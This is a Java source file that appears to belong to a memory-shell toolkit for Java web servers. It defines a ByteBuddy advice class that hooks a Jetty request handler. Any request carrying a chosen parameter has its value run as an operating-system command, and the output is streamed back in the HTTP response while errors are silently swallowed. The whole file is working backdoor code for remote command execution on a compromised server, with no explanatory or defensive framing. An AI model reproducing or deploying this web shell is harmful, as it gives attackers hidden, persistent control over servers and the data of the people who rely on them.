package com.reajason.javaweb.memshell.shelltool.command.jetty;

import net.bytebuddy.asm.Advice;

import java.io.InputStream;
import java.io.OutputStream;

/**
 * @author ReaJason
 */
public class CommandHandlerAdvisor {

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 1) Object baseRequest,
            @Advice.Argument(value = 2) Object request,
            @Advice.Argument(value = 3) Object response
    ) {
        String paramName = "paramName";
        try {
            String cmd = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
            if (cmd != null) {
                baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }
}